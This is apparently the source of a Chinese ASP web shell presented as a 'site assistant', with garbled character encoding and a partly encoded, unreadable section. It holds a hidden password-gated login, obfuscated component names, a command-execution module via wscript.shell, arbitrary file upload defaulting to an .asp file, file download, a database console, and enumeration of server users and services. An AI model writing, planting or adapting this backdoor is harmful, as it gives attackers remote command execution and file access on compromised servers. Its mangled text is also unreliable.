   <%@ LANGUAGE = VBScript.Encode %>
   <object runat="server" id="SX" scope="page" classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
   <object runat="server" id="SX" scope="page" classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
   <%
   Server.ScriptTimeout=200000
   Response.Buffer = True
   On Error Resume Next
   ApplicationName = "ÃÎÇåÔÆµÉçÇøÕ¾³¤ÖúÊÖÔöÇ¿°æ"
   UserPass        = "sxlflj"  'µÇÂ½ÃÜÂë
   IcoPath         = "http://www.GXGL.com/images/FileType/"
   ShowFileIco     = True                                     '#####ÊÇ·ñÏÔÊ¾Í¼±ê,FalseÎªÓÃÎÄ×ÖÍ¼±ê
   URL             = Request.ServerVariables("URL")
   ServerIP        = Request.ServerVariables("LOCAL_ADDR")
   Action          = Request("Action")
   RootPath        = Server.MapPath(".")
   WWWRoot         = Server.MapPath("/")
   FolderPath      = Request("FolderPath")
   FName           = Request("FName")
   BackUrl         = "<meta http-equiv='refresh' content='2;URL=?Action=ShowFile'>"

   If Session("webadmin")<>UserPass Then
     If Request.Form("Pass")<>"" Then
       If Request.Form("Pass")=UserPass Then
         Session("webadmin")=UserPass
         Response.Redirect URL
       Else
        response.write"ÑéÖ¤Ê§°Ü£¡"
       End If
     Else
       If Request("action")<>"login" then Response.Redirect"/"
       SI="<center style='font-size:12px'><br><br>»¶ÓÊ¹ÓÃÃÎÇåÔÆµÉçÇøASPÕ¾³¤ÖúÊÖ<br><br>"
       SI=SI&"<form action='"&URL&"' method='post'>"
       SI=SI&"ÇëÊäÈëÃÜÂë£º<input name='Pass' type='password' size='15'>"
       SI=SI&"&nbsp;<input type='submit' value='µÇÂ¼'></form></center>"
       Response.Write SI
     End If
     Response.End
   End If

   sub ShowErr()
     If Err Then
       Response.Write"<br><a href='javascript:history.back()'><br>&nbsp;" & Err.Description & "</a><br>"
       Err.Clear:Response.Flush
     End If
   end sub


   Dim ObT(13,2)
   ObT(0,0) = "Sc"&DEfd&"rip"&DEfd&"ting"&DEfd&".F"&DEfd&"ileS"&DEfd&"yste"&DEfd&"mObj"&DEfd&"ect"
     ObT(0,2) = "ÎÄ¼þ²Ù×÷×é¼þ"
   ObT(1,0) = "w"&DEfd&"sc"&DEfd&"ri"&DEfd&"pt.s"&DEfd&"he"&DEfd&"ll"
     ObT(1,2) = "ÃüÁîÐÐÖ´ÐÐ×é¼þ"
   ObT(2,0) = "ADOX.Catalog"
     ObT(2,2) = "ACCESS½¨¿â×é¼þ"
   ObT(3,0) = "JRO.JetEngine"
     ObT(3,2) = "ACCESSÑ¹Ëõ×é¼þ"
   ObT(4,0) = "Scrip"&DEfd&"ting"&DEfd&".D"&DEfd&"icti"&DEfd&"onary"
     ObT(4,2) = "Êý¾ÝÁ÷ÉÏ´«¸¨Öú×é¼þ"
   ObT(5,0) = "Adodb.connection"
     ObT(5,2) = "Êý¾Ý¿âÁ¬½Ó×é¼þ"
   ObT(6,0) = "Ado"&DEfd&"d"&DEfd&"b"&DEfd&".S"&DEfd&"tre"&DEfd&"am"
     ObT(6,2) = "Êý¾ÝÁ÷ÉÏ´«×é¼þ"
   ObT(7,0) = "SoftArtisans.FileUp"
     ObT(7,2) = "SA-FileUp ÎÄ¼þÉÏ´«×é¼þ"
   ObT(8,0) = "LyfUpload.UploadFile"
     ObT(8,2) = "ÁõÔÆ·åÎÄ¼þÉÏ´«×é¼þ"
   ObT(9,0) = "Persits.Upload.1"
     ObT(9,2) = "ASPUpload ÎÄ¼þÉÏ´«×é¼þ"
   ObT(10,0) = "JMail.SmtpMail"
     ObT(10,2) = "JMail ÓÊ¼þÊÕ·¢×é¼þ"
   ObT(11,0) = "CDONTS.NewMail"
     ObT(11,2) = "ÐéÄâSMTP·¢ÐÅ×é¼þ"
   ObT(12,0) = "SmtpMail.SmtpMail.1"
     ObT(12,2) = "SmtpMail·¢ÐÅ×é¼þ"
   ObT(13,0) = "Microsoft.XMLHTTP"
     ObT(13,2) = "Êý¾Ý´«Êä×é¼þ"

   For i=0 To 13
       Set T=Server.CreateObject(ObT(i,0))
       If -2147221005 <> Err Then
         IsObj=True
       Else
         IsObj=false
         Err.Clear
       End If
       Set T=Nothing
       ObT(i,1)=IsObj
   Next


   Function RePath(S)
     RePath=Replace(S,"\","\\")
   End Function

   Function RRePath(S)
     RRePath=Replace(S,"\\","\")
   End Function

   If FolderPath<>"" then
     Session("FolderPath")=RRePath(FolderPath)
   End If

   If Session("FolderPath")="" Then
     FolderPath=RootPath
     Session("FolderPath")=FolderPath
   End if

   Function IsIco(ia,ib,ta)
       If ShowFileIco=true Then
         IsIco = " <img src='"&IcoPath&ia&"'> "
         If ib<>"" Then
         IsIco = "<img src='"&IcoPath&ib&"'> "
         End If
       Else
         IsIco = "&nbsp;<font face='wingdings' color='#006600' size='3'>"&ta&"</font>  "
       End If
   End Function

   Function MainForm()
     SI="<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">"
     SI=SI&"<input type=""hidden"" name=""Action"">"
     SI=SI&"<input type=""hidden"" name=""FName"">"
     SI=SI&"</form>"
     SI=SI&"<table width='100%' height='100%'  border='0' cellpadding='0' cellspacing='0' bgcolor='menu'>"
     SI=SI&"<tr><td height='30' colspan='2'>"
     SI=SI&"<table width='100%' height='25'  border='0' cellpadding='0' cellspacing='0'>"
     SI=SI&"<form name='addrform' method='post' action='"&URL&"' target='_parent'>"
     SI=SI&"<tr><td width='60' align='center'>µØÖ·À¸£º</td><td>"
     SI=SI&"<input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>"
     SI=SI&"</td><td width='60' align='center'><input name='Submit' type='submit' value='×ªµ½'>"
     SI=SI&"</td></tr></form></table></td></tr><tr><td width='160'>"
     SI=SI&"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='2' scrolling='yes'></iframe></td>"
     SI=SI&"<td>"
     SI=SI&"<iframe name='FileFrame' src='?Action=ShowFile' width='100%' height='100%' frameborder='1' scrolling='yes'></iframe>"
     SI=SI&"</td></tr></table>"
     Response.Write SI
   End Function


   Function MainMenu()
     SI="<table width='100%' border='0' cellspacing='0' cellpadding='0'>"
     SI=SI&"<tr><td height='5'></td></tr>"
     SI=SI&"<tr><td>&nbsp;"
     SI=SI&IsIco("minus.gif","computer.gif","o")&"FSOÎÄ¼þ²Ù×÷Ä£¿é"
     SI=SI&"</td></tr>"
     If Not ObT(0,1) Then
       SI=SI&"<tr><td height='20'></td></tr>"
     Else
     Set ABC=New LBF:SI=SI&ABC.ShowDriver():Set ABC=Nothing
     SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
     SI=SI& IsIco("minus.gif","folder.gif","0")
     SI=SI&"<a href='javascript:ShowFolder(""C:\\Progra~1"")'>C:\Progra~1</a>"
     SI=SI&"</td></tr>"
     SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
     SI=SI& IsIco("minus.gif","folder.gif","0")
     SI=SI&"<a href='javascript:ShowFolder(""C:\\Docume~1"")'>C:\Docume~1</a>"
     SI=SI&"</td></tr>"
     SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
     SI=SI& IsIco("minus.gif","folder.gif","0")
     SI=SI&"<a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>Õ¾µã¸ùÄ¿Â¼</a>"
     SI=SI&"</td></tr>"
     SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
     SI=SI& IsIco("minus.gif","folder.gif","0")
     SI=SI&"<a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>±¾³ÌÐòÄ¿Â¼</a>"
     SI=SI&"</td></tr>"
     SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
     SI=SI& IsIco("minus.gif","newfolder.gif","1")
     SI=SI&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\NewFolder")&""",""NewFolder"")'>ÐÂ½¨Ä¿Â¼</a>"
     SI=SI&"</td></tr>"
     SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
     SI=SI&IsIco("minus.gif","newfile.gif","2")
     SI=SI&"<a href='?Action=EditFile' target='FileFrame'>ÐÂ½¨ÎÄ±¾</a>"
     SI=SI&"</td></tr>"
     End If
     Response.Write SI:SI=""

     SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
     SI=SI&IsIco("minus.gif","main.gif","8")
     SI=SI&"<a href='?Action=UpFile' target='FileFrame'>ÎÄ¼þÉÏ´«Ä£¿é</a>"
     SI=SI&"</td></tr>"
     SI=SI&"<tr><td height='20'>&nbsp;"
     SI=SI&IsIco("plus.gif","main.gif","o")
     SI=SI&"Êý¾Ý¿â²Ù×÷Ä£¿é"
     SI=SI&"</td></tr>"
     SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
     SI=SI&IsIco("minus.gif","newfile.gif","4")
     SI=SI&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>½¨Á¢MDBÎÄ¼þ</a>"
     SI=SI&"</td></tr>"
     SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
     SI=SI&IsIco("minus.gif","mdb.gif","4")
     SI=SI&"<a href='?Action=DbManager' target='FileFrame'>Êý¾Ý¿â²Ù×÷</a>"
     SI=SI&"</td></tr>"
     SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
     SI=SI&IsIco("minus.gif","zip.gif","4")
     SI=SI&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\data.mdb")&""",""CompactMdb"")'>Ñ¹ËõMDBÎÄ¼þ</a>"
     SI=SI&"</td></tr>"
     SI=SI&"<tr><td height='20'>&nbsp;"
     SI=SI&IsIco("minus.gif","cmd.gif","o")
     SI=SI&"<a href='?Action=CmdShell' target='FileFrame'>ÃüÁîÐÐÄ£¿é</a>"
     SI=SI&"</td></tr>"
     SI=SI&"<tr><td height='20'>&nbsp;"
     SI=SI&IsIco("minus.gif","main.gif","f")
     SI=SI&"<a href='?Action=Course' target='FileFrame'>ÏµÍ³·þÎñÁÐ±í</a>"
     SI=SI&"</td></tr>"
     SI=SI&"<tr><td height='20'>&nbsp;"
     SI=SI&IsIco("minus.gif","main.gif","f")
     SI=SI&"<a href='?Action=ServerInfo' target='FileFrame'>·þÎñÆ÷ÐÅÏ¢</a>"
     SI=SI&"</td></tr>"
     SI=SI&"<tr><td height='20'>&nbsp;"
     SI=SI&IsIco("minus.gif","main.gif","f")
     SI=SI&"<a href='?Action=Logout' target='_top'>ÍË³öµÇÂ¼</a>"
     SI=SI&"</td></tr>"
     SI=SI&"<tr><td height='20'>&nbsp;"
     SI=SI&IsIco("minus.gif","htm.gif","f")
     SI=SI&"<a href='http://www.gxgl.com' target='_blank'>¹ðÁÖÀÏ±øÕ¾</a>"
     SI=SI&"</td></tr>"
     SI=SI&"<tr><td height='20'>&nbsp;"
     SI=SI&IsIco("minus.gif","htm.gif","f")
     SI=SI&"<a href='http://www.sxhouse.org' target='_blank'>ÃÎÇåÔÆµÉçÇø</a>"
     SI=SI&"</td></tr>"
     SI=SI&"<tr><td height='20'>"
     SI=SI&"<br>&nbsp;Õ¾³¤ÖúÊÖ6ÔöÇ¿°æ<br>&nbsp;by Ê·Ïè QQ:863682<br><a href='http://www.sxhouse.org' target='_blank'><img src='http://www.sxhouse.org/logo.gif'></a>"
     SI=SI&"</td></tr>"
     SI=SI&"</table>"
     Response.Write SI : SI=""
   End Function

   Function Course()
     SI="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
     SI=SI&"<tr><td height='20' colspan='3' align='center' bgcolor='menu'>ÏµÍ³ÓÃ»§Óë·þÎñ</td></tr>"
     on error resume next
     for each obj in getObject("WinNT://.")
     err.clear
     if OBJ.StartType="" then
     SI=SI&"<tr>"
     SI=SI&"<td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"
     SI=SI&obj.Name
     SI=SI&"</td><td bgcolor=""#FFFFFF"">&nbsp;"
     SI=SI&"ÏµÍ³ÓÃ»§(×é)"
     SI=SI&"</td></tr>"
     SI0="<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">&nbsp;</td></tr>"
     end if
     if OBJ.StartType=2 then lx="×Ô¶¯"
     if OBJ.StartType=3 then lx="ÊÖ¶¯"
     if OBJ.StartType=4 then lx="½ûÓÃ"
     if LCase(mid(obj.path,4,3))<>"win" and OBJ.StartType=2 then
     SI1=SI1&"<tr><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[Æô¶¯ÀàÐÍ:"&lx&"]<font color=#FF0000>&nbsp;"&obj.path&"</font></td></tr>"
     else
     SI2=SI2&"<tr><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[Æô¶¯ÀàÐÍ:"&lx&"]<font color=#008000>&nbsp;"&obj.path&"</font></td></tr>"
     end if
     next
     Response.Write SI&SI0&SI1&SI2&"</table>"
   End Function

   Function ip()
   dim str,s,st,en
   str ="search_ip="&request.serverVariables("LOCAL_ADDR")&"&B1=%B2%E9%D1%AF"
   set s =server.createobject("msxml2.XMLHTTP")
   s.open "POST","http://ipseeker.cn/index.php?job=search",false
   s.setRequestHeader "Content-Length",Len(str)
   s.setRequestHeader "CONTENT-TYPE","application/x-www-form-urlencoded"
   s.send str
   s=bytes2BSTR(s.responseBody)
   st=instr(s,"¹Ù·½Êý¾Ý²éÑ¯½á¹û")
   en=instr(st,s,"</p>")
   str=mid(s,st+10,en-st-10)
   str=replace(str,addr,"")
   str=replace(str,"&nbsp; -&nbsp;","")
   if err.number<>0 then str="ÔÝÊ±Ã»ÓÐ²éÑ¯µ½ÐÅÏ¢"
   ip=str
   End Function

   Function bytes2BSTR(vIn)
   dim strReturn,i,ThisCharCode,NextCharCode
       strReturn = ""
       For i = 1 To LenB(vIn)
           ThisCharCode = AscB(MidB(vIn,i,1))
           If ThisCharCode < &H80 Then
               strReturn = strReturn & Chr(ThisCharCode)
           Else
               NextCharCode = AscB(MidB(vIn,i+1,1))
               strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode))
               i = i + 1
           End If
       Next
       bytes2BSTR = strReturn
   End Function

   Function ServerInfo()
     SI="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
     SI=SI&"<tr><td height='20' colspan='3' align='center' bgcolor='menu'>·þÎñÆ÷×é¼þÐÅÏ¢</td></tr>"
     SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>·þÎñÆ÷Ãû</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&request.serverVariables("SERVER_NAME")&"</td></tr>"
     SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>·þÎñÆ÷IP</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("LOCAL_ADDR")&"</td></tr>"
     SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>·þÎñÆ÷µØÀíÎ»ÖÃ</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&ip()&"</td></tr>"
     SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>·þÎñÆ÷Ê±¼ä</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&now&"&nbsp;</td></tr>"
     SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>·þÎñÆ÷CPUÊýÁ¿</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("NUMBER_OF_PROCESSORS")&"</td></tr>"
     SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>·þÎñÆ÷²Ù×÷ÏµÍ³</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("OS")&"</td></tr>"
     SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>WEB·þÎñÆ÷°æ±¾</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("SERVER_SOFTWARE")&"</td></tr>"
     For i=0 To 13
       SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>"&ObT(i,0)&"</td><td bgcolor='#FFFFFF'>"&ObT(i,1)&"</td><td bgcolor='#FFFFFF'>"&ObT(i,2)&"</td></tr>"
     Next
     Response.Write SI
   End Function


   Function DownFile(Path)
     Response.Clear
     Set OSM = CreateObject(ObT(6,0))
     OSM.Open
     OSM.Type = 1
     OSM.LoadFromFile Path
     sz=InstrRev(path,"\")+1
       Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(path,sz)
       Response.Charset = "UTF-8"
       Response.ContentType = "application/octet-stream"
       Response.BinaryWrite OSM.Read
       Response.Flush
     OSM.Close
     Set OSM = Nothing
   End Function

   Function HTMLEncode(S)
     if not isnull(S) then
       S = replace(S, CHR(38), "&#38;")
       S = replace(S, ">", "&gt;")
       S = replace(S, "<", "&lt;")
       S = replace(S, CHR(39), "&#39;")
       S = replace(S, CHR(34), "&quot;")
       S = replace(S, CHR(20), "&nbsp;")
       HTMLEncode = S
     end if
   End Function

   Function UpFile()
     If Request("Action2")="Post" Then
       Set U=new UPC : Set F=U.UA("LocalFile")
       UName=U.form("ToPath")
       If UName="" Or F.FileSize=0 then
         SI="<br>ÇëÊäÈëÉÏ´«µÄÍêÈ«Â·¾¶ºóÑ¡ÔñÒ»¸öÎÄ¼þÉÏ´«!"
       Else
           F.SaveAs UName
           If Err.number=0 Then
             SI="<center><br><br><br>ÎÄ¼þ"&UName&"ÉÏ´«³É¹¦£¡</center>"
           End if
       End If
       Set F=nothing:Set U=nothing
       SI=SI&BackUrl
       Response.Write SI
       ShowErr()
       Response.End
     End If
       SI="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
       SI=SI&"<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"
       SI=SI&"<tr><td>"
       SI=SI&"ÉÏ´«Â·¾¶£º<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\newup.asp")&"' size='40'>&nbsp;"
       SI=SI&"<input name='LocalFile' type='file'  size='25'>"
       SI=SI&"<input type='submit' name='Submit' value='ÉÏ´«'>"
       SI=SI&"</td></tr></form></table>"
     Response.Write SI
   End Function

   Function CmdShell()
     Session("ShellPath") = Request("SP")
     ShellPath=Session("ShellPath")
     If Request("cmd")<>"" Then DefCmd = Request("cmd")
     SI="<form method='post'><input name='cmd' Style='width:95%' class='cmd' value='"&DefCmd&"'><input type='submit' value='Ö´ÐÐ'>"
     SI=SI&"<textarea Style='width:100%;height:500;' class='cmd'>"
     if(ShellPath="" and Request.Form("cmd")<>"") Then aaa=doWsCmdRun(DefCmd)
     If(Request.Form("cmd")<>"" and ShellPath<>"") Then
     Set CM=CreateObject(ObT(1,0))
     Set DD=CM.exec(ShellPath&" /c "&DefCmd)
     aaa=DD.stdout.readall
     End If
     SI=SI&aaa
     SI=SI&chr(13)&"RarÃüÁîÐÐ½âÑ¹£ºc:\progra~1\winrar\rar.exe x c:\qq.rar c:\winnt\system ÔÚshellÂ·¾¶Áô¿ÕÔòÊ¹ÓÃwscript.shell,µ«²»¿ÉÒÔÔÚnetboxÏÂÊ¹ÓÃ! -by Ê·Ïè</textarea>"
     SI=SI&"SHELLÂ·¾¶£º<input name='SP' value='"&ShellPath&"' Style='width:91%'></form>"
     Response.Write SI
   End Function

   Function doWsCmdRun(cmdStr)
       If isDebugMode = False Then
           On Error Resume Next
       End If
       Dim fso, theFile
       Set fso = Server.CreateObject("Scripting.FileSystemObject")

       doWsCmdRun = SX.Exec(cmdStr).StdOut.ReadAll()
       If Err Then
           echo Err.Description & "<br>"
           Err.Clear
           SX.Run cmdStr & " > " & aspPath, 0, True
           Set theFile = fso.OpenTextFile(aspPath)
           doWsCmdRun = theFile.RealAll()
           If Err Then
               echo Err.Description & "<br>"
               Err.Clear
               doWsCmdRun = streamLoadFromFile(aspPath)
           End If
       End If
   End Function

   Function CreateMdb(Path)
      SI="<br><br>"
      Set C = CreateObject(ObT(2,0))
      C.Create("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Path)
      Set C = Nothing
      If Err.number=0 Then
        SI = SI & Path & "½¨Á¢³É¹¦!"
      End If
      SI=SI&BackUrl
      Response.Write SI
   End function

   Function CompactMdb(Path)
   If Not ObT(0,1) Then
       Set C=CreateObject(ObT(3,0))
         C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path
       Set C=Nothing
   Else
     Set FSO=CreateObject(ObT(0,1))
     If FSO.FileExists(Path) Then
       Set C=CreateObject(ObT(3,0))
         C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path&"_bak"
       Set C=Nothing
       FSO.DeleteFile Path
       FSO.MoveFile Path&"_bak",Path
     Else
       SI="<center><br><br><br>Êý¾Ý¿â"&Path&"Ã»ÓÐ·¢ÏÖ£¡</center>"
       Err.number=1
     End If
     Set FSO=Nothing
   End If
     If Err.number=0 Then
       SI="<center><br><br><br>Êý¾Ý¿â"&Path&"Ñ¹Ëõ³É¹¦£¡</center>"
     End If
     SI=SI&BackUrl
     Response.Write SI
   End Function


   Function DbManager()
     SqlStr=Trim(Request.Form("SqlStr"))
     DbStr=Request.Form("DbStr")

     SI=SI&"<table width='650'  border='0' cellspacing='0' cellpadding='0'>"
     SI=SI&"<form name='DbForm' method='post' action=''>"
     SI=SI&"<tr><td width='100' height='27'> &nbsp;Êý¾Ý¿âÁ¬½Ó´®:</td>"
     SI=SI&"<td><input name='DbStr' style='width:470' value="""&DbStr&"""></td>"
     SI=SI&"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>Á¬½Ó´®Ê¾Àý</option><option value=0>AccessÁ¬½Ó</option>"
     SI=SI&"<option value=1>MsSqlÁ¬½Ó</option><option value=2>MySqlÁ¬½Ó</option><option value=3>DSNÁ¬½Ó</option>"
     SI=SI&"<option value=-1>--SQLÓï·¨--</option><option value=4>ÏÔÊ¾Êý¾Ý</option><option value=5>Ìí¼ÓÊý¾Ý</option>"
     SI=SI&"<option value=6>É¾³ýÊý¾Ý</option><option value=7>ÐÞ¸ÄÊý¾Ý</option><option value=8>½¨Êý¾Ý±í</option>"
     SI=SI&"<option value=9>É¾Êý¾Ý±í</option><option value=10>Ìí¼Ó×Ö¶Î</option><option value=11>É¾³ý×Ö¶Î</option>"
     SI=SI&"<option value=12>ÍêÈ«ÏÔÊ¾</option></select></td></tr>"
     SI=SI&"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
     SI=SI&"<tr><td height='30'>&nbsp;SQL²Ù×÷ÃüÁî:</td>"
     SI=SI&"<td><input name='SqlStr' style='width:470' value="""&SqlStr&"""></td>"
     SI=SI&"<td align='center'><input type='submit' name='Submit' value='Ö´ÐÐ' onclick='return DbCheck()'></td>"
     SI=SI&"</tr></form></table><span id='abc'></span>"
     Response.Write SI:SI=""

     If Len(DbStr)>40 Then

     Set Conn=CreateObject(ObT(5,0))
     Conn.Open DbStr
     Set Rs=Conn.OpenSchema(20)
     SI=SI&"<table><tr height='25' Bgcolor='#CCCCCC'><td>±í<br>Ãû</td>"
     Rs.MoveFirst
     Do While Not Rs.Eof
       If Rs("TABLE_TYPE")="TABLE" then
         TName=Rs("TABLE_NAME")
         SI=SI&"<td align=center><a href='javascript:FullSqlStr(""DROP TABLE ["&TName&"]"",1)'>[ del ]</a><br>"
         SI=SI&"<a href='javascript:FullSqlStr(""SELECT * FROM ["&TName&"]"",1)'>"&TName&"</a></td>"
       End If
       Rs.MoveNext
     Loop
     Set Rs=Nothing
     SI=SI&"</tr></table>"
     Response.Write SI:SI=""



   If Len(SqlStr)>10 Then

     If LCase(Left(SqlStr,6))="select" then
       SI=SI&"Ö´ÐÐÓï¾ä£º"&SqlStr
       Set Rs=CreateObject("Adodb.Recordset")
       Rs.open SqlStr,Conn,1,1
       FN=Rs.Fields.Count
       RC=Rs.RecordCount
       Rs.PageSize=20
       Count=Rs.PageSize
       PN=Rs.PageCount
       Page=request("Page")
       If Page<>"" Then Page=Clng(Page)
       If Page="" Or Page=0 Then Page=1
       If Page>PN Then Page=PN
       If Page>1 Then Rs.absolutepage=Page
       SI=SI&"<table><tr height=25 bgcolor=#cccccc><td></td>"
       For n=0 to FN-1
         Set Fld=Rs.Fields.Item(n)
         SI=SI&"<td align='center'>"&Fld.Name&"</td>"
         Set Fld=nothing
       Next
       SI=SI&"</tr>"

       Do While Not(Rs.Eof or Rs.Bof) And Count>0
         Count=Count-1
         Bgcolor="#EFEFEF"
         SI=SI&"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"
         For i=0 To FN-1
           If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
           If RC=1 Then
              ColInfo=HTMLEncode(Rs(i))
           Else
              ColInfo=HTMLEncode(Left(Rs(i),50))
           End If
           SI=SI&"<td bgcolor="&Bgcolor&">"&ColInfo&"</td>"
         Next
         SI=SI&"</tr>"
         Rs.MoveNext
       Loop

       Response.Write SI:SI=""

       SqlStr=HtmlEnCode(SqlStr)

       SI=SI&"<tr><td colspan="&FN+1&" align=center>¼ÇÂ¼Êý£º"&RC&"&nbsp;Ò³Âë£º"&Page&"/"&PN
       If PN>1 Then
         SI=SI&"&nbsp;&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""",1)'>Ê×Ò³</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>ÉÏÒ»Ò³</a>&nbsp;"
         If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
         For i=Sp To Sp+8
           If i>PN Then Exit For
           If i=Page Then
           SI=SI&i&"&nbsp;"
           Else
           SI=SI&"<a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a>&nbsp;"
           End If
         Next
         SI=SI&D+6'E%l7ldmMk2O=sE^s?$V?D.cJrJL?5VjOM[EJrSJLnCL _F'E*B@*ÏÂÒ»Ò³@!JC@*[U(/ai@!mP4.+6'vLm\Cd1DkaO)wEV^j5VUYM`EJE'U;s?D.[rJESr[nH'r#v@*Î²Ò³@!&m@*E@#@&,PP,2 [P&0@#@&,P~~Uq'U([r@!tM~^W^WM'va3oAs3sE@*@!JY[@*@!zY.@*@!zOl(s @*E@#@&,PP,Ik Z^Wd+=?nO,I/{HWDtk L@#@&i@#@&d]+d2Kxd+c    DbYn~Uq)j({JE@#@&~,2sk+iPP,@#@&~P,P/W   x 3X+m!O+v?;^jOD*@#@&P~P~j&'jqLE?5SÓï¾ä£ºE'U;VjOM@#@&P,3    N~&0@#@&@#@&P,]+kwGxk+  MkY ~?&)?&xEJ@#@&Ax[P(W@#@&@#@&,~ZKxU ;VWdn@#@&~PUnDP/Kx    '1KY4rxT@#@&P,2U[,q0@#@&2   NPw;UmDkKx@#@&/GsXAA==^#~@%>
   <head>
   <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
   <title><%=ApplicationName&" - "&ServerIP%></title>
   <style type="text/css">
   <!--
     body,td {font-size: 12px;}
     input,select{font-size: 12px;background-color:#FFFFFF;}
     .tr {background-color:#EFEFEF;}
     .cmd {background-color:#000000;color:#FFFFFF}
     body {margin-left: 0px;margin-top: 0px;margin-right: 0px;margin-bottom: 0px;
       <%If Action="" then response.write "overflow-x:hidden;overflow-y:hidden;"%>}
     a {color: black;text-decoration: none;}
     .am {color: #003366;font-size: 11px;}
   -->
   </style>
   <script language="javascript">
     function yesok(){
       if (confirm("È·ÈÏÒªÖ´ÐÐ´Ë²Ù×÷Âð£¿"))
           return true;
       else
           return false;
       }

     function ShowFolder(Folder){
       top.addrform.FolderPath.value = Folder;
       top.addrform.submit();
       }

     function FullForm(FName,FAction){
       top.hideform.FName.value = FName;
       if(FAction=="CopyFile"){
           DName = prompt("ÇëÊäÈë¸´ÖÆµ½Ä¿±êÎÄ¼þÈ«Ãû³Æ",FName);
           top.hideform.FName.value += "||||"+DName;
       }else if(FAction=="MoveFile"){
           DName = prompt("ÇëÊäÈëÒÆ¶¯µ½Ä¿±êÎÄ¼þÈ«Ãû³Æ",FName);
           top.hideform.FName.value += "||||"+DName;
       }else if(FAction=="CopyFolder"){
           DName = prompt("ÇëÊäÈëÒÆ¶¯µ½Ä¿±êÎÄ¼þ¼ÐÈ«Ãû³Æ",FName);
           top.hideform.FName.value += "||||"+DName;
       }else if(FAction=="MoveFolder"){
           DName = prompt("ÇëÊäÈëÒÆ¶¯µ½Ä¿±êÎÄ¼þ¼ÐÈ«Ãû³Æ",FName);
           top.hideform.FName.value += "||||"+DName;
       }else if(FAction=="NewFolder"){
